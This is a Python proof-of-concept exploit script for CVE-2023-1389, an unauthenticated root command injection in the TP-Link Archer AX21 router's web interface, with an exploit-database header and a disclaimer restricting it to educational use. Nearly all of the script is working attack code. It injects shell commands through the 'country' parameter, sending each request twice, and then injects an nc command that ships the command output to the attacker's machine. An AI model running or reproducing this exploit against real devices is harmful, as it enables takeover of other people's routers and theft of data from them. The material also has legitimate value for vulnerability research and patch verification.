#!/usr/bin/python3
# 
# Exploit Title: TP-Link Archer AX21 Unauthenticated Command Injection
# Date: 07/25/2023
# Exploit Author: Voyag3r (https://github.com/Voyag3r-Security)
# Vendor Homepage: https://www.tp-link.com/us/
# Version: TP-Link Archer AX21 (AX1800) firmware versions before 1.1.4 Build 20230219 (https://www.tenable.com/cve/CVE-2023-1389)
# Tested On: Firmware Version 2.1.5 Build 20211231 rel.73898(5553); Hardware Version Archer AX21 v2.0
# CVE: CVE-2023-1389
#
# Disclaimer: This script is intended to be used for educational purposes only.
# Do not run this against any system that you do not have permission to test.
# The author will not be held responsible for any misuse or damage caused with
# this script. 
# 
# CVE-2023-1389 is an unauthenticated command injection vulnerability in the web
# management interface of the TP-Link Archer AX21 (AX1800), specifically, in the
# *country* parameter of the *write* callback for the *country* form at the 
# "/cgi-bin/luci/;stok=/locale" endpoint. By modifying the country parameter it is 
# possible to run commands as root. Execution requires sending the request twice;
# the first request sets the command in the *country* value, and the second request 
# (which can be identical or not) executes it.
# 
# This script is my first iteration at a proof of concept. It sends the output of 
# the executed command to the file /tmp/out, then uses nc to transfer that file to
# the attacker device, where the contents are then printed. To learn more about the 
# development of this program, you can read the blog post: 
# https://medium.com/@voyag3r-security/exploring-cve-2023-1389-rce-in-tp-link-archer-ax21-d7a60f259e94

import requests, urllib.parse, os, argparse
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Suppress warning for connecting to a router with a self-signed certificate
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Take user input for the router, attacker IP and port, and command to run
parser = argparse.ArgumentParser()

parser.add_argument("-r", "--router", dest = "router", default = "192.168.0.1", help="Router name")
parser.add_argument("-a", "--attacker", dest = "attacker", default = "127.0.0.1", help="Attacker IP")
parser.add_argument("-c", "--command",dest ="command", default = "id", help="Command to run (\"ls /tmp\")")
parser.add_argument("-p", "--port",dest = "port", default = "9999", help="Local port")

args = parser.parse_args()

# URL for the command to run, sending the output to /tmp/out for reading
url_command = "https://" + args.router + "/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(" + urllib.parse.quote(args.command) + "+%3e+/tmp/out)"

# URL to transfer the contents of /tmp/out back to your machine
url_output = "https://" + args.router + "/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(nc+" + args.attacker + "+" + args.port + "+%3c+/tmp/out)"

# Send the first URL twice to send command output to /tmp/out. Sending twice is necessary for the attack
r = requests.get(url_command, verify=False)
r = requests.get(url_command, verify=False)

# Start a nc listener and redirect the input to ./out
os.system("nc -lnvp " + args.port + " > out &")

# Send the second URL twice to send the contents of /tmp/out to your machine over nc
r = requests.get(url_output, verify=False)
r = requests.get(url_output, verify=False)

# Print the output from the command you ran on the router 
os.system("cat out")
